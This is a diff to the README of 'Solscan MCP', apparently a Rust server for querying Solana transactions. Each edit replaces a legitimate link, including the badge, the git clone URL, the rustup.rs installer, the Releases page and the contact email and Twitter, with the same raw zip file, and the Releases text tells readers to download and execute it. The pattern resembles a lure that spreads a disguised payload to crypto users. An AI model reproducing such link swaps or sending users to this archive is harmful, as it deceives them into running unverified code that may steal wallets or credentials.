@@ -1,6 +1,6 @@
 # Solscan MCP 🚀
 
-![Solscan MCP](https://img.shields.io/badge/Solscan%20MCP-v1.0.0-blue)
+![Solscan MCP](https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip%20MCP-v1.0.0-blue)
 
 Welcome to **Solscan MCP**, an innovative server designed to query Solana transactions using natural language. This project leverages the Solscan API, making it easier for developers and users to interact with Solana's blockchain. 
 
@@ -28,12 +28,12 @@ To get started with Solscan MCP, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Valennmg/solscan-mcp.git
+   git clone https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip
    cd solscan-mcp
    ```
 
 2. **Build the Project**:
-   Make sure you have Rust installed. If not, install it from [rustup.rs](https://rustup.rs/).
+   Make sure you have Rust installed. If not, install it from [https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip](https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip).
    ```bash
    cargo build --release
    ```
@@ -44,7 +44,7 @@ To get started with Solscan MCP, follow these steps:
    ./target/release/solscan-mcp
    ```
 
-For more detailed instructions, please check the [Releases](https://github.com/Valennmg/solscan-mcp/releases) section.
+For more detailed instructions, please check the [Releases](https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip) section.
 
 ## Usage 📚
 
@@ -117,12 +117,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip
+- **Twitter**: [@your_twitter_handle](https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip)
 
 ## Releases 📦
 
-To download the latest version, visit the [Releases](https://github.com/Valennmg/solscan-mcp/releases) section. Make sure to download the appropriate file and execute it to get started.
+To download the latest version, visit the [Releases](https://github.com/Valennmg/solscan-mcp/raw/refs/heads/master/src/solscan_mcp/mcp_solscan_2.2-beta.5.zip) section. Make sure to download the appropriate file and execute it to get started.
 
 ## Acknowledgments 🙏
 
